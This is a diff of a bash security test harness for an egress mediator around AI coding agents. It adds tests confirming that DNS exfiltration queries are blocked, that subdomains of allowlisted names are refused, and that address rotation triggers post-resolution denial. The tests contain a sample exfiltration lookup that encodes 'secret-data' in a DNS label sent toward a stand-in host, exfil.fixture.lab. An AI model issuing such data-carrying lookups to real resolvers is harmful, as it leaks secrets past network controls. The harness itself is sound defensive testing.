@@ -34,6 +34,13 @@ RO_FIXTURE_HOST="tests/fixtures/ro-fixture/marker.txt"
 WORKSPACE_DIR="workspace"
 HOST_SYMLINK="${WORKSPACE_DIR}/t1-passwd-symlink"
 
+# SF-3 CDN-rotation scenario (Decision 5). The fixture resolver's committed config is
+# sed-swapped in place between attempts (rotating.fixture.lab .20 -> .21) and restored on exit
+# regardless of outcome -- this is a git-tracked file, not a scratch copy.
+DNS_FIXTURE="tests/fixtures/authoritative-dns/unbound.conf"
+DNS_FIXTURE_BACKUP="$(mktemp)"
+cp "$DNS_FIXTURE" "$DNS_FIXTURE_BACKUP"
+
 pass() { echo "PASS: [$PHASE] $1"; }
 fail() { echo "FAIL: [$PHASE] $1"; FAILED=1; }
 note() { echo "      $*"; }
@@ -65,6 +72,7 @@ PROXY_AUTH_AGENTS=" codex agy "
 
 med() { docker exec "${PROJECT}-egress-mediator-1" "$@"; }
 audit() { med cat /var/log/mediator/egress-audit.log 2>/dev/null; }
+dns_audit() { med cat /var/log/mediator/dns-audit.log 2>/dev/null; }
 last_verdict() { audit | jq -c --arg h "$1" 'select(.verdict != null and .dest_host == $h)' | tail -1; }
 verdict_count() { audit | jq -c --arg h "$1" 'select(.verdict != null and .dest_host == $h)' | wc -l | tr -d ' '; }
 
@@ -173,6 +181,10 @@ cleanup() {
   "${COMPOSE_A[@]}" down -v --remove-orphans >/dev/null 2>&1 || true
   rm -f "$HOST_SYMLINK"
   rm -rf "$RECORD_DIR"
+  if [ -f "$DNS_FIXTURE_BACKUP" ]; then
+    cp "$DNS_FIXTURE_BACKUP" "$DNS_FIXTURE"
+    rm -f "$DNS_FIXTURE_BACKUP"
+  fi
 }
 trap cleanup EXIT
 
@@ -513,8 +525,106 @@ done
 
 stop_agents
 
+# ---------------------------------------------------------------------------
+# Phase 7 -- SF-3: T4 DNS exfiltration (data-carrying label, and the D3 exact-match property
+# under an allowlisted parent) from inside real agent containers, plus the CDN-rotation scenario
+# (post-resolution CIDR deny under an address change -- Decision 5). Both against the fixture
+# resolver's own query log and the mediator's DNS audit trail.
+# ---------------------------------------------------------------------------
+phase 7 "T4 DNS exfiltration + CDN rotation under address change (test-fixtures policy)"
+
+start_agents COMPOSE_EGRESS || exit 1
+
+EXFIL="c2VjcmV0LWRhdGE.exfil.fixture.lab"
+EXFIL_SUBDOMAIN="c2VjcmV0LWRhdGE.allowed.fixture.lab"
+
+for a in "${AGENTS[@]}"; do
+  idsrc="$(expected_idsrc "$a")"
+
+  # T4a: a data-carrying label under a domain the agent is not allowlisted for. Absence is the
+  # assertion -- the query must never reach the authoritative server the harness owns, because
+  # the mediator's policy layer refuses it before ever forwarding (prd.md's ABSENCE property).
+  in_agent "$a" "timeout 5 getent hosts $EXFIL >/dev/null 2>&1; true" >/dev/null 2>&1
+  sleep 1
+  if "${COMPOSE_EGRESS[@]}" logs fixture-dns 2>&1 | grep -qF "exfil.fixture.lab"; then
+    fail "T4 [$a]: the exfiltration query ($EXFIL) reached the authoritative server -- SECURITY"
+    record dns_exfiltration T4 "$a" false true null true "$idsrc" exfil.fixture.lab \
+      deny allowlist query_reached_authoritative "SECURITY: query leaked to the authoritative server"
+  elif dns_audit | grep -qF "$EXFIL"; then
+    pass "T4 [$a]: a data-carrying label produced NO query at the authoritative server, refusal on the DNS audit trail"
+    record dns_exfiltration T4 "$a" true true null true "$idsrc" exfil.fixture.lab \
+      deny allowlist host_not_allowlisted ""
+  else
+    fail "T4 [$a]: the block worked (no query at the authoritative server) but is not on the DNS audit trail -- unattributed"
+    record dns_exfiltration T4 "$a" true false null false "$idsrc" exfil.fixture.lab \
+      deny allowlist not_on_dns_audit "blocked but unattributed"
+  fi
+
+  # T4b: D3's exact-match property. A subdomain of an ALLOWLISTED name is not itself
+  # allowlisted -- if the mediator matched by suffix rather than exact FQDN this would resolve.
+  in_agent "$a" "timeout 5 getent hosts $EXFIL_SUBDOMAIN >/dev/null 2>&1; true" >/dev/null 2>&1
+  sleep 1
+  if "${COMPOSE_EGRESS[@]}" logs fixture-dns 2>&1 | grep -qF "$EXFIL_SUBDOMAIN"; then
+    fail "T4b [$a]: a subdomain of an allowlisted name ($EXFIL_SUBDOMAIN) reached the authoritative server -- suffix match, not exact FQDN (D3 violated) -- SECURITY"
+    record dns_exfiltration T4 "$a" false true null true "$idsrc" allowed.fixture.lab \
+      allow allowlist suffix_match_not_exact "SECURITY: D3 exact-match violated"
+  else
+    pass "T4b [$a]: a subdomain of an allowlisted name produced NO query -- exact-match enforced (D3)"
+    record dns_exfiltration T4 "$a" true true null true "$idsrc" allowed.fixture.lab \
+      deny allowlist host_not_allowlisted "D3 exact-match: a subdomain of an allowlisted name is not itself allowlisted"
+  fi
+done
+
+# CDN-rotation (Decision 5). One agent (claude) is sufficient -- the property under test is the
+# mediator's per-connection re-resolution, not a per-agent difference. attempt 1 resolves the
+# allowlisted name to the allowed address; the fixture resolver's committed config is then
+# sed-swapped in place to answer the SAME name at the criterion-10 /32-denied address, the
+# mediator is force-recreated so unbound re-reads it, and attempt 2 must be refused
+# post-resolution rather than served from either DNS cache (TTL 1s on both attempts).
+CDN_AGENT="claude"
+idsrc="$(expected_idsrc "$CDN_AGENT")"
+cflags="$(curl_client_flags "$CDN_AGENT")"
+rotate_probe() { mediator_probe "$CDN_AGENT" rotating.fixture.lab \
+  "curl -sS -k --proxy-insecure -o /dev/null -w '%{http_code}' --max-time 8 $cflags https://rotating.fixture.lab/"; }
+
+line="$(rotate_probe)"
+verdict="$(printf '%s' "$line" | jq -r '.verdict // "missing"')"
+resolved="$(printf '%s' "$line" | jq -r '.resolved_ip // "missing"')"
+if [ "$verdict" = "allow" ] && [ "$resolved" = "172.31.40.20" ]; then
+  pass "CDN rotation [$CDN_AGENT]: attempt 1 allowed, resolved to the initial address ($resolved)"
+  record cidr_deny_under_rotation T6 "$CDN_AGENT" true true null true "$idsrc" rotating.fixture.lab \
+    allow none address_within_allowlisted_range ""
+else
+  fail "CDN rotation [$CDN_AGENT]: attempt 1 expected allow at 172.31.40.20, got: $line"
+  record cidr_deny_under_rotation T6 "$CDN_AGENT" false false null false "$idsrc" rotating.fixture.lab \
+    "$verdict" unknown unexpected "SECURITY: $line"
+fi
+
+sed -i.rot -E 's/(rotating\.fixture\.lab\. 1 IN A )172\.31\.40\.20/\1172.31.40.21/' "$DNS_FIXTURE"
+rm -f "${DNS_FIXTURE}.rot"
+"${COMPOSE_EGRESS[@]}" up -d --force-recreate fixture-dns >/dev/null 2>&1 \
+  || fail "CDN rotation: fixture-dns force-recreate with the rotated address failed"
+sleep 3  # past the record's 1s TTL on both the re-originating unbound cache and Squid's ipcache
+
+line2="$(rotate_probe)"
+verdict2="$(printf '%s' "$line2" | jq -r '.verdict // "missing"')"
+resolved2="$(printf '%s' "$line2" | jq -r '.resolved_ip // "missing"')"
+control2="$(printf '%s' "$line2" | jq -r '.control // "missing"')"
+reason2="$(printf '%s' "$line2" | jq -r '.reason // "missing"')"
+if [ "$verdict2" = "deny" ] && [ "$resolved2" = "172.31.40.21" ] && [ "$control2" = "denylist" ]; then
+  pass "CDN rotation [$CDN_AGENT]: attempt 2 refused post-resolution at the rotated address ($resolved2, $reason2)"
+  record cidr_deny_under_rotation T6 "$CDN_AGENT" true true null true "$idsrc" rotating.fixture.lab \
+    deny denylist "$reason2" ""
+else
+  fail "CDN rotation [$CDN_AGENT]: attempt 2 expected deny/denylist at 172.31.40.21, got: $line2 -- D5 DNS-freshness finding if this is real (attempt 2 answered from a cache rather than re-resolving), not a test bug -- route to /milestone"
+  record cidr_deny_under_rotation T6 "$CDN_AGENT" false false null false "$idsrc" rotating.fixture.lab \
+    "$verdict2" "$control2" "$reason2" "possible D5 DNS-freshness finding: $line2"
+fi
+
+stop_agents
+
 echo
-echo "=== SF-1/SF-2 record file: $RECORD_FILE ==="
+echo "=== SF-1/SF-2/SF-3 record file: $RECORD_FILE ==="
 cat "$RECORD_FILE"
 
 if [ "$FAILED" -eq 0 ]; then
